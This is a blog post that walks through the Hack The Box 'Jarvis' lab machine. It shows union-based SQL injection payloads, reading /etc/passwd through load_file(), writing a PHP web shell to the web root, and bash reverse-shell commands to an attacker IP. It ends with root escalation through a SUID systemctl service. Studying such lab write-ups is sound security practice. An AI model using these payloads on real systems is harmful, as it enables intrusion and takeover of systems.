<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1.0, user-scalable=no">

    
      <link rel="icon" href="/favicon.png" />
    

    <title>
        
          Hack The Box - Jarvis - DiegoExploit
        
    </title>
    <style>
  #carbonads {
    border: 1px solid black;
    border-radius: 7px;
    border-spacing: 7px;
    display: block;
    overflow: hidden;
    padding: 1em;
    line-height: 1.5;
  }
  #carbonads span {
    position: relative;
    display: block;
    overflow: hidden;
  }
  .carbon-img {
    float: left;
    margin-right: 1em;
  }
  .carbon-img img {
    display: block;
  }
  .carbon-text {
    display: block;
    float: left;
    max-width: calc(100% - 130px - 1em);
    text-align: left;
  }
  .carbon-poweredby {
    position: absolute;
    left: 142px;
    bottom: 0;
    display: block;
    font-size: .8em;
    line-height: 1;
    letter-spacing: 1px;
    }
    </style>
    <!-- Spectre.css framework -->
    <link rel="stylesheet" href="https://unpkg.com/spectre.css/dist/spectre.min.css">
    <link rel="stylesheet" href="https://unpkg.com/spectre.css/dist/spectre-exp.min.css">
    <link rel="stylesheet" href="https://unpkg.com/spectre.css/dist/spectre-icons.min.css">

    <!-- theme css & js -->
    
<link rel="stylesheet" href="/css/book.css">

    
<script src="/js/book.js"></script>


    <!-- tocbot -->
    <script src="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.min.js"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.css">
    
    <!-- katex -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">

    
<!-- Google Tag Manager -->
<script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
'https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
})(window,document,'script','dataLayer','GTM-P385GSF');</script>
<!-- End Google Tag Manager -->
<!-- Google Tag Manager (noscript) -->
<noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-P385GSF"
height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
<!-- End Google Tag Manager (noscript) -->

    
<script src="https://cdnjs.cloudflare.com/ajax/libs/zooming/2.1.1/zooming.min.js"></script>
<script>
document.addEventListener('DOMContentLoaded', function () {
    const zooming = new Zooming()
    zooming.listen('.book-content img')
})
</script>

    <style>
      #htbbadge{
        float: left;
      }
    </style>
<meta name="generator" content="Hexo 4.2.0"><link rel="alternate" href="/feed.xml" title="DiegoExploit" type="application/rss+xml">
</head>

<body>

<div class="book-container">
  <div class="book-sidebar">
    <div class="book-brand">
  <a href="/">
    <img src="/favicon.png">
    <span>DiegoExploit</span>
  </a>
</div>
    <div class="book-menu">
  <ul>
<li><a href="/">Home</a></li>
</ul>
<h1 id="Categories Windows"><a href="#Categories Windows" class="headerlink" title="Categories Windows"></a>Categories Windows</h1><h2 id="Hack-The-Box-"><a href="#Hack-The-Box-" class="headerlink" title="Hack The Box"></a>Hack The Box </h2><ul>
<li><a href="/hack-the-box/legacy/">1. Hack The Box - Legacy</a></li>
<li><a href="/hack-the-box/devel/">2. Hack The Box - Devel</a></li>
<li><a href="/hack-the-box/optimum/">3. Hack The Box - Optimum</a></li>
<li><a href="/hack-the-box/bastard/">4. Hack The Box - Bastard</a></li>
<li><a href="/hack-the-box/artic/">5. Hack The Box - Artic</a></li>
<li><a href="/hack-the-box/grandpa/">6. Hack The Box - Grandpa</a></li>
<li><a href="/hack-the-box/granny/">7. Hack The Box - Granny</a></li>
<li><a href="/hack-the-box/blue/">8. Hack The Box - Blue</a></li>
<li><a href="/hack-the-box/silo/">9. Hack The Box - Silo</a></li>
<li><a href="/hack-the-box/bounty/">10. Hack The Box - Bounty</a></li>
<li><a href="/hack-the-box/jerry/">11. Hack The Box - Jerry</a></li>
<li><a href="/hack-the-box/conceal/">12. Hack The Box - Conceal</a></li>
<li><a href="/hack-the-box/chatterbox/">13. Hack The Box - Chatterbox</a></li>
<li><a href="/hack-the-box/forest/">14. Hack The Box - Forest</a></li>
<li><a href="/hack-the-box/bankrobber/">15. Hack The Box - BkRobber</a></li>
<li><a href="/hack-the-box/secnotes/">16. Hack The Box - Secnotes</a></li>
<li><a href="/hack-the-box/bastion/">17. Hack The Box - Bastion</a></li>

</ul>
<h1 id="Categories Linux"><a href="#Categories Linux" class="headerlink" title="Categories Linux"></a>Categories Linux</h1><h2 id="Hack-The-Box-"><a href="#Hack-The-Box-" class="headerlink" title="Hack The Box"></a>Hack The Box </h2><ul>
<li><a href="/hack-the-box/lame/">1. Hack The Box - Lame</a></li>
<li><a href="/hack-the-box/popcorn/">2. Hack The Box - Popcorn</a></li>
<li><a href="/hack-the-box/beep/">3. Hack The Box - Beep</a></li>
<li><a href="/hack-the-box/tenten/">4. Hack The Box - Tenten</a></li>
<li><a href="/hack-the-box/cronos/">5. Hack The Box - Cronos</a></li>
<li><a href="/hack-the-box/brainfuck/">6. Hack The Box - brainfuck</a></li>
<li><a href="/hack-the-box/shocker/">6. Hack The Box - Shocker</a></li>
<li><a href="/hack-the-box/bashed/">7. Hack The Box - Bashed</a></li>
<li><a href="/hack-the-box/nibbles/">8. Hack The Box - Nibbles</a></li>
<li><a href="/hack-the-box/nineveh/">9. Hack The Box - Nineveh</a></li>
<li><a href="/hack-the-box/sense/">10. Hack The Box - Sense</a></li>
<li><a href="/hack-the-box/solidstate/">11. Hack The Box - SolidState</a></li>
<li><a href="/hack-the-box/kotarak/">12. Hack The Box - Kotarak</a></li>
<li><a href="/hack-the-box/node/">13. Hack The Box - Node</a></li>
<li><a href="/hack-the-box/valentine/">14. Hack The Box - Valentine</a></li>
<li><a href="/hack-the-box/poison/">15. Hack The Box - Poison</a></li>
<li><a href="/hack-the-box/sunday/">16. Hack The Box - Sunday</a></li>
<li><a href="/hack-the-box/TartaSauce/">17. Hack The Box - TartaSauce</a></li>
<li><a href="/hack-the-box/friendzone/">18. Hack The Box - Friendzone</a></li>
<li><a href="/hack-the-box/swagshop/">19. HTB- SwagShop</a></li>
<li><a href="/hack-the-box/jarvis/">20. Hack The Box Jarvis</a></li>
</ul>




</div>


<script src="/js/book-menu.js"></script>

  </div>

  <div class="off-canvas-content">
    <div class="columns">
      <div class="column col-10 col-lg-12">
        <div class="book-navbar">
          <!-- For Responsive Layout -->

<header class="navbar">
  <section class="navbar-section">
    <a onclick="open_sidebar()">
      <i class="icon icon-menu"></i>
    </a>
  </section>
</header>

        </div>
        <div class="book-content">
          <div class="book-post">
  <br>
  <h1 id="Hack-The-Box-jarvis"><a href="#Hack-The-Box-jarvis" class="headerlink" title="Hack The Box - jarvis"></a>Hack The Box - jarvis</h1><h2 id="Quick-Summary"><a href="#Quick-Summary" class="headerlink" title="Quick Summary"></a>Quick Summary</h2><p>Jarvis is a medium difficulty Linux box running a web server, which has DoS and brute force protection enabled. A page is found to be vulnerable to SQL injection, which requires manual exploitation. This service allows the writing of a shell to the web root for the foothold. The www user is allowed to execute a script as another user, and the script is vulnerable to command injection. On further enumeration, systemctl is found to have the SUID bit set, which is leveraged to gain a root shell. Its IP address is <code>10.10.10.143</code> Letâ€™s go to hack!!!<br><img src="/images/hackthebox/exploit/jarvis/0.png" alt=""></p>
<h2 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h2>
<p>As always we will start with <code>nmap</code> for search open ports.
<pre><figure class="highlight plain"> |-------(root@kali)-------|(~/HackTheBox)                                                        
 |                                                                                     
 |-->{SFire129}#nmap -p- -T 5 10.10.10.143                                             
 Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-19 13:18 EDT                       
 Nmap scan report for 10.10.10.143                                                     
 Host is up (0.17s latency).                                                           
 Not shown: 65532 closed ports                                                         
 PORT      STATE SERVICE                                                               
 22/tcp    open  ssh                                                                   
 80/tcp    open  http                                                                  
 64999/tcp open  unknown                                                               
                                                                                       
 Nmap done: 1 IP address (1 host up) scanned in 500.89 seconds  </figure></pre>
<p>The box show a web page over service http.
  <img src="/images/hackthebox/exploit/jarvis/1.png" alt=""></p>
   <h2 id="Enumeration"><a href="#Enumeration" class="Enumeration" title="Enumeration"></a>Enumeration</h2>
 <p>The web page was developed on php lenguage, the first step is to enumerate manually if has injection sql. In the section room with <code>'-- -</code>, but not return image.<code>http://10.10.10.143/room.php?cod=1'-- -</code>
 <img src="/images/hackthebox/exploit/jarvis/2.png" alt=""></p>
 <p>However, on removing the quote and retrying, the room image is returned. We can infer from this that the server expects an integer for the parameter, and that it is SQL injectable.<code>-- -</code>,<code>http://10.10.10.143/room.php?cod=1--%20-</code>
 <img src="/images/hackthebox/exploit/jarvis/3.png" alt=""></p>
 <p>The URL <code>10.10.10.143/room.php?cod=1 and 1=1-- -</code> results in a true and true clause resulting in a true result overall and the room is returned. But if we use a true and false clause like <code>10.10.10.143/room.php?cod=1 and 1=2-- -</code>:
 <img src="/images/hackthebox/exploit/jarvis/16.png" alt=""></p>
 <p>The URL <code>http://10.10.10.143/room.php?cod=1 order by 5</code> returns the room which means the table has either 5 columns or more. On incrementing the value by 1 each time, we find that no room is return for the value 8 which means that the table has 7 columns.
 <img src="/images/hackthebox/exploit/jarvis/4.png" alt=""></p>
 <p>Now we can use union based queries in order to find the injectable columns. <code>http://10.10.10.143/room.php?cod=-1 union select 1,2,3,4,5,6,7</code>, use the negative value to prevent the room being selected over our values.
 <img src="/images/hackthebox/exploit/jarvis/5.png" alt=""></p>
 <p>We see the values 5, 2, 3 and 4 in the output which can be used for injection. Letâ€™s check the database version and the user we are running as. <code>http://10.10.10.143/room.php?cod=-1%20union%20select%201,database(),user(),4,5,6,7</code>, <code> -1 union select 1, database(),user(),4,5,6,7</code> 
 <img src="/images/hackthebox/exploit/jarvis/6.png" alt=""></p>
 <p>The server is MariaDB, and weâ€™re running as the DBadmin user. Letâ€™s check if we can read files using the load_file() function. <code>http://10.10.10.143/room.php?cod=-1%20union%20select%201,load_file(%27/etc/passwd%27),3,4,5,6,7</code> <code>-1 union select 1, load_file('/etc/passwd'),3,4,5,6,7</code>
 <img src="/images/hackthebox/exploit/jarvis/7.png" alt=""></p>
 <p>check the url <code>http://10.10.10.143/room.php?cod=-1%20union%20select%201,load_file(%27/etc/apache2/sites-enabled/000-default.conf%27),3,4,5,6,7</code> will be show information about that web page location.
 <img src="/images/hackthebox/exploit/jarvis/8.png" alt=""></p>
 <h2 id="Exploit"><a href="#Exploit" class="Exploit" title="Exploit"></a>Exploit</h2>
 <p>Create the file with simple web shell php <code>-1 union select 1,' ?php system($_REQUEST["cmd"]);?>',3,4,5,6,7 into outfile  '/var/www/html/diego.php'</code>
 <img src="/images/hackthebox/exploit/jarvis/10.png" alt=""></p>
 <p>Run the web shell to work.
 <img src="/images/hackthebox/exploit/jarvis/11.png" alt=""></p>
 <p>Split the terminal with tmux, run the netcat conectino, with curl, run the commands for reverse connection <code>curl -X POST http://10.10.10.144/diego.php --data-urlenconde 'cmd=bash -c "bash -i >& /dev/tcp/10.10.14.6/1234 0>&1"'</code>
 <img src="/images/hackthebox/exploit/jarvis/12.png" alt=""></p>
 <p>Setup the terminal for work.
 <img src="/images/hackthebox/exploit/jarvis/13.png" alt=""></p>
 <p>Create a reverse shell in /tmp/ location for connection as a user system.
 <img src="/images/hackthebox/exploit/jarvis/14.png" alt=""></p>
 <p>The command <code>sudo -l</code> show a file for run as user system and then we could be create a reverse connection likes a pepper user.
 <img src="/images/hackthebox/exploit/jarvis/15.png" alt=""></p>
 <h2 id="Get-Privileges"><a href="#Get-Privileges" class="Get-Privileges" title="Get-Privileges"></a>Get Privileges</h2>
  <p>After enumerating SUID files, we see systemctl which isnâ€™t an SUID by default.  Run the command <code>find / -perm -4000 2>/dev/null</code>
<pre><figure class="highlight plain"> pepper@jarvis:~$ find / -perm -4000 2>/dev/null
/bin/fusermount
/bin/mount
/bin/ping
/bin/systemctl
/bin/umount
/bin/su
/usr/bin/newgrp
/usr/bin/passwd
/usr/bin/gpasswd
/usr/bin/chsh
/usr/bin/sudo
/usr/bin/chfn
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
pepper@jarvis:~$ </figure></pre>
<p>With the help GTFObins <code>https://gtfobins.github.io/gtfobins/systemctl/</code> we could be create a service that run as a root. First create a file with name cmd.service in home location with the next:
<pre><figure class="highlight plain"> [Service]
Type=oneshot
ExecStart=/home/pepper/shell2.sh
[Install]
WantedBy=multi-user.target</figure></pre>
<p>In the same folder create a shell2.sh file with the next:
<pre><figure class="highlight plain"> #!/bin/bash
bash -c "bash -i >& /dev/tcp/10.10.14.6/4567 0>&1"
</figure></pre>
<p>Finally run the next commands and run the nc listener, in my case over 4567 port:
 <img src="/images/hackthebox/exploit/jarvis/17.png" alt=""></p>
 <p>We are the root user.
 
  <h2 id="Capture-The-Flag"><a href="#Capture-The-Flag" class="Capture-The-Flag" title="Capture-The-Flag"></a>Capture The Flag</h2>
 <pre><figure class="highlight plain">root@jarvis:/# cat /home/pepper/user.txt
cat /home/pepper/user.txt
***Here you could find the user flag***
root@jarvis:/# cat /root/root.txt
cat /root/root.txt
***Here you could find the root flag***
root@jarvis:/# 
</figure></pre>
 
<p> And we owned root !</p>
</div>


  <div class="book-comments">
    




  </div>



<script src="/js/book-post.js"></script>

        </div>
      </div>
      <div class="column col-2 hide-lg">
        <div class="book-post-info">
  
    <div class="book-post-meta">

  <div class="author">

    <!-- Author image -->
    <div class="author-img">
      
        <figure class="avatar avatar-lg">
          <img src="/avatar.png" alt="...">
        </figure>
      
    </div>

    <!-- Author title -->
    <div class="author-title">
      <div>DiegoExploit</div>
      <div>2020-07-19</div>
    </div>
  </div>

  
    <div class="divider"></div>

    <div class="link">
      <a class="category-link" href="/categories/hack-the-box/">hack-the-box</a>

      <a class="tag-link" href="/tags/linux/" rel="tag">#Linux</a> <a class="tag-link" href="/tags/sqli/" rel="tag">#sqlinjection</a> <a class="tag-link" href="/tags/ssh/" rel="tag">#systemctl</a>
    </div>
    
  

  <div class="divider"></div>
</div>
  

  <div class="book-tocbot">
</div>
<div class="book-tocbot-menu">
  <a class="book-toc-expand" onclick="expand_toc()">Expand all</a>
  <a onclick="go_top()">Back to top</a>
  <a onclick="go_bottom()">Go to bottom</a>
</div>


<script src="/js/book-toc.js"></script>

</div>
      </div>
    </div>
  </div>
  
  <a class="off-canvas-overlay" onclick="hide_canvas()"></a>
</div>

</body>
</html>


<script src="/js/book.js"></script>
